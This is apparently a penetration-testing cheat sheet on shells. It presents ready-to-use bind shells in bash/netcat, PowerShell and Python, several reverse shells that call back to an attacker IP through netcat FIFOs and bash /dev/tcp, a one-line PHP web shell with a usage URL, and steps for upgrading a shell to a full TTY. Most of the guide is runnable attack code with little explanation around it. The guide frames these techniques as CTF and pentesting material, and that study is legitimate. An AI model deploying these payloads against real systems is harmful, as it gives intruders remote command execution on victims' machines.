
# 🐚 Shells in Penetration Testing – Quick Guide

This document explains **how different types of shells work in penetration testing**, including:

- Bind shells
- Reverse shells
- Web shells
- Shell stabilization

A useful resource for generating shells quickly:

🔗 https://www.revshells.com/

---

# Bind Shells

A **bind shell** works when:

- The **target machine acts as a server**
- The **attacker acts as a client**
- The target **opens a port and waits for a connection**

Once connected, the attacker can execute commands on the victim machine.

⚠️ Requirement:  
The target machine usually needs a **public IP address** or reachable network.

---

## Example – Linux Bind Shell

Run on the **target machine**:

```bash
rm -f /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc -l 192.168.1.104 7777 > /tmp/f
````

This creates a **listener on port 7777**.

---

### Connect from the attacker machine

```bash
nc -nv 192.168.1.104 7777
```

Once connected, you get a **remote shell**.

---

## Example – Windows PowerShell Bind Shell

Run on the **target machine**:

```powershell
$listener = [System.Net.Sockets.TcpListener]4444
$listener.Start()
$client = $listener.AcceptTcpClient()
$stream = $client.GetStream()

$reader = New-Object System.IO.StreamReader($stream)
$writer = New-Object System.IO.StreamWriter($stream)

while ($null -ne ($data = $reader.ReadLine())) {
    $output = (Invoke-Expression $data 2>&1) | Out-String
    $writer.WriteLine($output)
    $writer.Flush()
}
```

Connect from the attacker:

```bash
nc -nv TARGET_IP 4444
```

---

## Example – Python Bind Shell

Python can be used to create a **cross-platform bind shell**.

```python
python3 -c '
import socket, subprocess
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("0.0.0.0",4444))
s.listen(1)
conn, addr = s.accept()

while True:
    data = conn.recv(1024).decode()
    if not data:
        break
    output = subprocess.run(data, shell=True, capture_output=True)
    conn.send(output.stdout + output.stderr)

s.close()
'
```

---

# Reverse Shells

A **reverse shell** is the opposite of a bind shell.

Instead of the attacker connecting to the victim:

* The **victim machine connects back to the attacker**
* The attacker **runs a listener**
* The victim **initiates the connection**

This technique works better when the victim is behind a firewall or NAT.

Useful resources:

* [https://www.revshells.com](https://www.revshells.com)
* [https://pentestmonkey.net](https://pentestmonkey.net)

---

## Setup Listener (Attacker)

```bash
nc -lvnp 4444
```

---

## Linux Reverse Shell Example

Run on the **target machine**:

```bash
rm /tmp/f
mkfifo /tmp/f
cat /tmp/f | sh -i 2>&1 | nc 10.10.14.42 9001 > /tmp/f
```

The victim machine will connect back to:

```
10.10.14.42
```

---

## Bash Reverse Shell (RCE Example)

If you can execute commands via **Remote Code Execution (RCE)**:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.42/4441 0>&1'
```

Listener on attacker:

```bash
nc -lvnp 4441
```

---

## FIFO Netcat Reverse Shell

Another common method:

```bash
rm /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.42 9001 > /tmp/f
```

---

# Web Shells

A **web shell** is a script uploaded to a web server that allows remote command execution.

Usually written in:

* PHP
* ASPX
* JSP

If a vulnerability allows **file upload**, an attacker may upload a web shell.

---

## Example – PHP Web Shell

```php
<?php system($_REQUEST['cmd']); ?>
```

Usage example:

```
http://target.com/shell.php?cmd=id
```

This executes the command:

```
id
```

on the target server.

---

# Shell Stabilization

Reverse shells are often **unstable and limited**.

To upgrade them to a **fully interactive TTY**, use the following steps.

---

## Step 1 – Spawn a TTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Step 2 – Background the Shell

Press:

```
CTRL + Z
```

---

## Step 3 – Fix Terminal

Run on your attacker machine:

```bash
stty raw -echo
fg
```

Press **Enter twice**.

---

## Step 4 – Fix Terminal Type

```bash
export TERM=xterm
```

Now you have a **stable interactive shell**.

---

# ⚡ Summary

Types of shells used in penetration testing:

| Shell Type       | Description                                |
| ---------------- | ------------------------------------------ |
| Bind Shell       | Target opens port and attacker connects    |
| Reverse Shell    | Target connects back to attacker           |
| Web Shell        | Web-based command execution                |
| Stabilized Shell | Upgraded shell with full terminal features |

Common tools used:

* `nc` (netcat)
* `python`
* `bash`
* `openssl`
* `php`

---

# 🧠 Practical Usage

These techniques are commonly used in:

* Capture The Flag (CTF) competitions
* Penetration testing
* Post-exploitation
* Red team operations

